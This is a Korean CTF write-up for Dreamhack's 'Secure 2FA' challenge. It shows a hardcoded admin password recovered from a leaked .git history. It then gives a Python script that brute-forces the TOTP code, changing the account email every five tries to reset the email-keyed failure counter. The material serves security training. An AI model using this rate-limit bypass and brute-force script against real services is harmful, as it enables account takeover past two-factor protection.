# Secure 2FA
https://dreamhack.io/wargame/challenges/1251
## Description
```
드림이가 만든 웹 서비스의 git 리포지토리가 유출되었어요.
admin의 비밀번호도 숨겨 놓고 TOTP (Time-based One-Time Password)도 적용해서 안전하다는데...

git 리포지토리와 소스 코드를 분석하여 취약점을 찾고 익스플로잇하여 플래그를 획득하세요!

플래그 형식은 DH{...} 입니다.
```

# Exploit

## Get password
노출된 `.git`파일을 이욯해 `git cat-file` `git diff`로 과거 커밋에서 하드코딩된 비밀번호 확인 가능.
```
const ADMIN_PASSWORD = '7h15_i5_4dm1n_p4S5wo2d_:)';
const ADMIN_SECRET = process.env.ADMIN_SECRET;
```

## TOTP bypass

```js
async function getFailureCount(username) {
    const expirationSeconds = getExpirationSeconds();
    const redisKey = `TOTP_AUTH_FAILURE_COUNT:${accounts[username].email}`;
    const ret = await redisClient.multi()
        .incr(redisKey)
        .expire(redisKey, expirationSeconds, 'NX')
        .exec();
    return ret[0] - 1;
}
```
TOTP인증 제한회수를 확인해보면 `accounts[username].email`을 사용한다.


```js
app.get('/mypage', (req, res) => {
    if (req.session.isSignedIn !== true) {
        res.status(403);
        res.send('you are not signed in.');
        return;
    }

    const username = req.session.username;
    account = accounts[username];

    res.render('mypage', {
        username: username,
        name: account['name'],
        age: account['age'],
        email: account['email']
    });
});
```
`/mypage`엔드포인트에서는 `account['email']`의 값을 수정할 수 있다.

`TOTP`를 5회 시도하고 `email`을 바꾸는 방식으로 무작위 대입을 할 수 있다.    
그래서
```py
import requests
import random
import string
import sys


class Exploit():
    def __init__(self, port):
        self.status = False
        self.token = 100000
        self.baseurl = 'http://host3.dreamhack.games:'+port
        self.s = requests.session()

    def changeEmail(self):
        email = ''.join([string.ascii_letters[random.randint(1, 50)] for i in range(10)])
        data = {
            'name': 'Carl Dream',
            'age': 0,
            'email': f"{email}@example.com"
        }
        self.s.post(url=self.baseurl+'/mypage', data=data)

    def adminLogin(self):
        data = {
            'username': 'admin',
            'password': '7h15_i5_4dm1n_p4S5wo2d_:)'
        }
        self.s.post(url=self.baseurl+'/signin', data=data)

    def attack(self):
        self.adminLogin()
        while self.status == False:
            data = {'token': self.token}
            r = self.s.post(url=self.baseurl+'/admin', data=data)
            print(f"token > {self.token} {r.status_code} {r.text}")
            if self.token % 5 == 0:
                self.changeEmail()
            if r.status_code == 200:
                self.status == True
            self.token += 1


if __name__ == "__main__":
    Exploit(port=sys.argv[1]).attack()
```
FLAG를 얻을 수 있다.